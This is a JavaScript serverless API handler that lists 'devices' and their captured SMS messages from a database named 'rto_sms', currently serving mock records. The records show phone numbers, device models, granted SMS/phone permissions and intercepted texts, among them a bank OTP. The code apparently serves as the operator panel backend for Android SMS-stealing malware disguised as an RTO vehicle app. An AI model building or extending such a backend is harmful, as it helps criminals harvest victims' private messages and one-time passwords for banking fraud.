export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method !== 'GET') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    // ✅ TODO: Replace with actual MongoDB query
    // const { MongoClient } = require('mongodb');
    // const client = new MongoClient(process.env.MONGODB_URI);
    // await client.connect();
    // const db = client.db('rto_sms');
    // const collection = db.collection('devices');
    // const users = await collection.find({}).sort({created_at: -1}).limit(50).toArray();
    // await client.close();
    // return res.status(200).json(users);
    
    // Mock data for now (replace with real DB query above)
    const mockUsers = [
      {
        id: 1,
        device_phone: "+91-9876543210",
        device_model: "Samsung Galaxy S21",
        android_version: "11",
        install_time: "1758712575970",
        permissions_granted: "SMS,PHONE,CALL",
        created_at: new Date(Date.now() - 86400000).toISOString(),
        sms_messages: [
          "From BANK: Your OTP is 123456",
          "From RTO: Vehicle registration due", 
          "From FRIEND: Hey, how are you?"
        ]
      },
      {
        id: 2,
        device_phone: "+91-8765432109",
        device_model: "OnePlus 9",
        android_version: "12", 
        install_time: "1758712575980",
        permissions_granted: "SMS,PHONE,CALL",
        created_at: new Date().toISOString(),
        sms_messages: [
          "From BANK: Payment successful Rs.500",
          "From RTO: Challan payment received",
          "From WORK: Meeting at 3 PM today"
        ]
      }
    ];
    
    res.status(200).json(mockUsers);
    
  } catch (error) {
    console.error('❌ Error fetching users:', error);
    res.status(500).json({ 
      error: 'Failed to fetch users',
      message: error.message 
    });
  }
}
